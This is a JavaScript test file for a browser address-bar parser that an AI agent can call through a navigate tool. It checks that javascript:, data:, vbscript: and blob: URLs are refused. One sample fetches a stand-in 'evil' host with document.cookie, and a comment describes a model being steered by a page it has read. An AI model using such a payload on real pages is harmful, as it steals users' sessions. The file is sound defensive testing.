// Address-bar parsing (ADR-0037, issue #146).
import {test, assertEq, finish} from '../../../shell/testing/harness.js';
import {resolveInput} from '../lib/url.js';

const kind = (input) => resolveInput(input).kind;
const url = (input) => resolveInput(input).url;

// --- The security case, first because it is the one that matters -----
//
// `navigate` is an Agent Bus tool, so a URL can arrive from the model,
// and a model can be steered by a page it just read. A javascript: URL
// executes in the CURRENT page's context — a logged-in session.

test('javascript: URLs are refused, however they are spelled', () => {
    for (const attempt of [
        'javascript:alert(1)',
        'JavaScript:alert(1)',
        'JAVASCRIPT:fetch("https://evil/"+document.cookie)',
        '  javascript:alert(1)',
        '\tjavascript:void(0)',
    ]) {
        assertEq(kind(attempt), 'refused', `not refused: ${attempt}`);
        assertEq(url(attempt), null);
    }
});

test('other executing or embedding schemes are refused too', () => {
    for (const attempt of [
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
        'blob:https://example.com/uuid',
        'DATA:text/html,x',
    ]) {
        assertEq(kind(attempt), 'refused', `not refused: ${attempt}`);
    }
});

test('a refusal explains itself', () => {
    const {reason} = resolveInput('javascript:alert(1)');
    assertEq(typeof reason === 'string' && reason.length > 0, true);
});

// --- Ordinary browsing ------------------------------------------------

test('explicit schemes pass through untouched', () => {
    assertEq(url('https://lisaos.dev/x?y=1#z'), 'https://lisaos.dev/x?y=1#z');
    assertEq(url('http://example.com'), 'http://example.com');
    assertEq(url('file:///home/lisa/notes.html'), 'file:///home/lisa/notes.html');
    assertEq(url('about:blank'), 'about:blank');
});

test('a bare host gets https, not http', () => {
    // Defaulting to plaintext in 2026 would be our bug.
    assertEq(url('lisaos.dev'), 'https://lisaos.dev');
    assertEq(url('example.com/path?q=1'), 'https://example.com/path?q=1');
});

test('local addresses keep http, because dev servers are not https', () => {
    assertEq(url('localhost:3000'), 'http://localhost:3000');
    assertEq(url('127.0.0.1:8080'), 'http://127.0.0.1:8080');
    assertEq(url('192.168.1.7'), 'http://192.168.1.7');
});

test('anything with a space is a search', () => {
    assertEq(kind('how tall is everest'), 'search');
    assertEq(kind('rm -rf explained'), 'search');
    // Including things that would otherwise look like hosts.
    assertEq(kind('example.com is down'), 'search');
});

test('a word with no dot is a search, not a host', () => {
    assertEq(kind('everest'), 'search');
    assertEq(kind('notes'), 'search');
});

test('localhost is a host despite having no dot', () => {
    assertEq(kind('localhost'), 'load');
    assertEq(url('localhost'), 'http://localhost');
});

test('searches are URL-encoded into the template', () => {
    const {url: u} = resolveInput('a & b', {searchTemplate: 'https://s/?q=%s'});
    assertEq(u, 'https://s/?q=a%20%26%20b');
});

test('unknown schemes are handed on rather than guessed at', () => {
    // Not our business to enumerate every URI scheme; the executing ones
    // are already refused above.
    assertEq(kind('mailto:a@b.com'), 'load');
    assertEq(kind('magnet:?xt=urn:btih:abc'), 'load');
});

test('empty input is a no-op search, not a crash', () => {
    assertEq(kind(''), 'search');
    assertEq(kind('   '), 'search');
    assertEq(kind(null), 'search');
    assertEq(kind(undefined), 'search');
});

test('a trailing or leading dot is not a host', () => {
    assertEq(kind('example.'), 'search');
    assertEq(kind('.com'), 'search');
});

finish();
